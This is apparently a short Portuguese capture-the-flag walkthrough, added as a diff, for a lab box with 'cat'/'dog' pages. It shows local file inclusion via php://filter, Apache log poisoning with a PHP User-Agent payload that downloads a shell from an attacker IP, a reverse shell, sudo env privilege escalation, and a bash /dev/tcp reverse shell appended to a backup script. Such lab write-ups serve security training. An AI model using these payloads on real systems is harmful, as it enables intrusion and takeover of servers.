@@ -1,0 +1,39 @@
+Ao entrarmos no site temos 2 opções "cat" ou "dog" ou clicar em qualquer um vemos na url "view=" isso nos indica LFI
+
+Usamos o comando php://filter/read=convert.base64-encode/resource=./dog/../index para ver se funcionar e... funcionou!
+
+Agora temos que passar nossa shell
+
+Baixamos a rev shell wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+
+E editamos ela corretamente
+
+Ultilizamos o burp para nos ajudar
+
+E fazemos uma requisição e mandamos para o repeater
+
+Agora abrimos uma conexao em nossa maquina com a porta 80
+
+Agora voltamos para o burp e depois do "GET" colocamos isso /?view=./dog/../../../../../../../../../var/log/apache2/access.log&ext=
+
+E no campo "user-agent" colocamos isso "<?php file_put_contents('tico.php',file_get_contents('http://10.X.X.X/shell.php')); ?>"
+
+Agora abrimos a porta no netcat com a mesma escolhida na shell.php
+
+E acessamos a url "ip/tico.php"
+
+e temos uma shell
+
+Damos sudo -l e podemos rodar /env como www-data
+
+Usamos sudo env /bin/bash e pegamos nossa flag root
+
+Agora dentro da pasta "opt/backups" tem um script
+
+Vamos passa um comando nele para nos dar outra shell 
+
+echo "bash -i >& /dev/tcp/10.9.200.252/4443 0>&1" >> backup.sh
+                                                                                                                                                                                                                                           
+Abrimos a porta no netcat                                                                                                                                                                                                                  
+                                                                                                                                                                                                                                           
+E damos cat backup.sh e temos nossa ultima flag 
